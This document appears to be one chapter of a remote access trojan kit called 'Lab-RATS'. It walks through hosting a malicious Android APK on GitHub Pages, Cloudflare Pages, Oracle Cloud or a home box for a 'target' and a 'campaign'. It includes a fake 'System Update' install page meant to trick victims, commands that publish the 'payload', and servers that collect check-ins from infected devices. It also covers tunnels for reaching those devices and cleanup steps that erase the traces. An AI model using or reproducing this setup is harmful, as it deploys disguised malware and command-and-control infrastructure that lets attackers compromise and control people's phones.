# 14 — Free IPv6-capable hosting

> Two jobs need a host: delivering the APK, and receiving check-ins. Both can be done for free. This
> doc ranks the options by effort and gives the exact steps for each.

---

## Which job do you have?

| Need | Section |
| --- | --- |
| Serve the APK once, to one target | [1 — GitHub Pages](#1-github-pages-easiest) |
| Serve the APK, want HTTPS and a CDN | [2 — Cloudflare Pages](#2-cloudflare-pages) |
| Serve the APK *and* log check-ins to a file you own | [3 — Oracle Always Free](#3-oracle-cloud-always-free-receiver) |
| You have native v6 at home and want to serve from your own box | [4 — dynv6 + home box](#4-dynv6--home-box) |
| Your workstation has no v6 and you need to *reach* a device | [5 — getting v6 on your workstation](#5-getting-v6-on-your-workstation) |

**Hosting the APK does not require the device to have IPv6.** GitHub Pages, Cloudflare and Oracle are
all dual-stack. Only the control path (doc 12) needs device-side v6.

---

## 1. GitHub Pages (easiest)

Confirmed v6-native — GitHub enabled IPv6 for all `*.github.io` in 2021. Public repo required on the
free plan.

### 1.1 Create a throwaway repo

<https://github.com/new> → name it `labrats-dl` → **Public** → **Create repository**.

### 1.2 Upload the APK

On the empty repo page: **uploading an existing file** → drag `apk-builder/output/signed_v1.apk` in →
**Commit changes**. Short, space-free filename.

### 1.3 Add `.nojekyll`

**Add file → Create new file** → name it exactly `.nojekyll` → commit empty.

Stops Jekyll from processing the upload; files under underscore paths get skipped otherwise.

### 1.4 Enable Pages

**Settings → Pages** → Source: **Deploy from a branch** → Branch **main**, folder **/ (root)** →
**Save**.

First deploy takes 1–2 minutes. URL appears at the top of that same screen:

```
https://<user>.github.io/labrats-dl/signed_v1.apk
```

### 1.5 Fix the content type if needed

Pages sometimes serves `.apk` as `text/plain` and a browser renders binary instead of installing.
Add an `index.html` at the root and send *that* URL:

```html
<!doctype html>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>System Update</title>
<body style="font-family:system-ui;padding:2rem;text-align:center">
  <h1>System Update</h1>
  <p>Tap to install the latest stability patch.</p>
  <a href="signed_v1.apk" download
     style="display:inline-block;padding:1rem 2rem;background:#111;color:#fff;
            border-radius:8px;text-decoration:none">Download</a>
</body>
```

`download` forces the save. The landing page is a bonus — it reads as plausible.

### 1.6 CLI variant

```bash
cd /tmp && mkdir labrats-dl && cd labrats-dl
cp ~/Lab-RATS-v1.6/apk-builder/output/signed_v1.apk .
touch .nojekyll
git init -b main
git remote add origin git@github.com:<user>/labrats-dl.git
git add . && git commit -m "payload"
git push -u origin main
```

Then §1.4.

### 1.7 Limits

| Limit | Value |
| --- | --- |
| Site size | 1 GB (APK is 10–15 MB) |
| Bandwidth | 100 GB/month, soft |
| Builds | 10/hour, soft |
| Deploy timeout | 10 minutes |

Soft limits — GitHub contacts you before pulling the site.

### 1.8 Cleanup

The repo is public, so the payload and its package ID are readable by anyone who finds it. Delete the
repo after the campaign; the URL dies with it.

### 1.9 What it doesn't do

No receiver. Check-ins need the Google Sheet (doc 12 §4c) or §3 below.

---

## 2. Cloudflare Pages

Same shape, better CDN, same limitation — static only. Use when you want HTTPS and no GitHub
fingerprint.

```bash
npx wrangler pages deploy apk-builder/output --project-name labrats
```

Then add `_headers` for the type:

```
/signed_v1.apk
  Content-Type: application/vnd.android.package-archive
  Content-Disposition: attachment
```

`*.pages.dev` is dual-stack and has no sleep. Free plan allows unlimited requests and 500 builds/month.
Same public-exposure caveat as §1.

---

## 3. Oracle Cloud Always Free (receiver)

Free forever, real v6, root, your own ports. The only free option that covers both jobs. Costs a signup
with card verification and ~20 minutes.

**ARM allowance note:** Oracle halved the Ampere A1 free tier in June 2026. You get 2 OCPU / 12 GB
total, which is plenty for this.

### 3.1 Instance

1. Sign up at <https://www.oracle.com/cloud/free/> and pick a home region.
2. Compute → Instances → **Create instance**. Shape: **VM.Standard.A1.Flex**, 1 OCPU / 6 GB.
   Image: Ubuntu 22.04.
3. Add your SSH key. Create.

### 3.2 Enable IPv6 on the VCN

VCN → **CIDR Blocks** → Add IPv6 CIDR block (`/56` from Oracle's pool).
Subnet → **Add IPv6 CIDR** → assign a `/64`.
Instance → **Attached VNICs** → IPv6 addresses → assign one from the `/64`.

### 3.3 Open the ports

Both layers, or nothing works:

- VCN → Security Lists → default → add ingress rules for TCP **8080** and **9000**, source `::/0`.
- On the host:

```bash
sudo ip6tables -A INPUT -p tcp --dport 8080 -j ACCEPT
sudo ip6tables -A INPUT -p tcp --dport 9000 -j ACCEPT
sudo netfilter-persistent save
```

### 3.4 Install the helpers

Drop `serve_apk.py` and `checkin_rx.py` from doc 12's appendix on the box, in
`/opt/labrats/`. Then:

```bash
sudo apt update && sudo apt install -y python3
sudo mkdir -p /opt/labrats/serve && cd /opt/labrats/serve
# copy the APK here
```

Two systemd units:

```ini
# /etc/systemd/system/labrats-apk.service
[Unit]
Description=Lab-RATS APK server
After=network-online.target

[Service]
WorkingDirectory=/opt/labrats/serve
ExecStart=/usr/bin/python3 /opt/labrats/serve_apk.py
Restart=always

[Install]
WantedBy=multi-user.target
```

```ini
# /etc/systemd/system/labrats-rx.service
[Unit]
Description=Lab-RATS check-in receiver
After=network-online.target

[Service]
WorkingDirectory=/opt/labrats
ExecStart=/usr/bin/python3 /opt/labrats/checkin_rx.py
Restart=always

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now labrats-apk labrats-rx
journalctl -u labrats-rx -f        # watch check-ins
```

### 3.5 Webhook value

```
WEBHOOK_URL=http://[<instance-v6>]:9000/checkin
```

### 3.6 Hardening this box

- Receiver has no auth — anyone with the address can append junk. Add an `ip6tables` source
  restriction if that matters.
- `checkins.log` grows unbounded; add a logrotate rule or truncate periodically.
- Oracle reclaims idle Always Free instances. Don't leave it dark for weeks.
- Port 8080 is public and serves whatever is in that directory. Clear it after the campaign.

---

## 4. dynv6 + home box

Only if your ISP gives you native v6 and you want no cloud dependency.

[dynv6.com](https://dynv6.com/) is free DDNS with AAAA. It can derive the record from your `/64`
prefix plus a host ID, so Android's privacy-extension rotation doesn't break it — a full address would.

Then run `serve_apk.py` on the box, open 8080 in the router's v6 firewall, and use the dynv6 hostname
as the delivery URL. Needs the box awake; a laptop that sleeps is a bad host.

---

## 5. Getting v6 on your workstation

Needed to *reach* a device, not to host. Check your router for an IPv6 WAN setting first — most ISPs
support it and it's off by default.

If the ISP genuinely doesn't:

| Service | Method | Behind CGNAT |
| --- | --- | --- |
| [route64.org](https://route64.org/) | WireGuard, routes a /56 | **Yes** |
| [tunnelbroker.net](https://tunnelbroker.net/) | 6in4 / proto 41 | No |
| [tb.tahio.eu](https://tb.tahio.eu/) | Tunnel broker | Varies |

route64 is the one for CGNAT — automated signup, real AS212895, WireGuard so proto 41 blocking
doesn't matter. A tunnel adds latency; don't route through one when both ends have native v6.

```bash
sudo wg-quick up wg0
curl -6 -s https://ifconfig.co     # expect your routed /56
```

---

## 6. Verification

Never test from your own LAN.

```bash
curl -sI "https://<user>.github.io/labrats-dl/signed_v1.apk" | head -5
dig +short AAAA <user>.github.io | head -3
curl -i --max-time 10 "http://[<instance-v6>]:8080/signed_v1.apk"
```

Want `200`, a plausible content type, and at least one AAAA. Then tether a phone to cellular and try
the real URL from there.

---

## 7. Free-tier reality, late 2026

| Platform | Status |
| --- | --- |
| GitHub Pages | Alive, v6-native, soft limits |
| Cloudflare Pages | Alive, v6-native, generous |
| Oracle Always Free | Alive, ARM halved June 2026, reclaims idle instances |
| Fly.io | Free tier gone for new accounts — trial only |
| Koyeb | Free instance requires a card since Feb 2026 |
| Render | Free tier alive but sleeps after 15 min — bad for polling |

Anything that sleeps is fine for a static APK and bad for a receiver the device polls.

---

## 8. Minimum viable combination

Pages for delivery, Google Sheet for check-ins, direct IPv6 for control. Zero cost, zero boxes, and
nothing to maintain. Move to the Oracle receiver only when you need check-ins in a file you control.

Cleanup order at the end of a campaign: `suicide` from the Ghost tab → delete the Pages repo → delete
the Sheet → revoke the Oracle instance if you made one.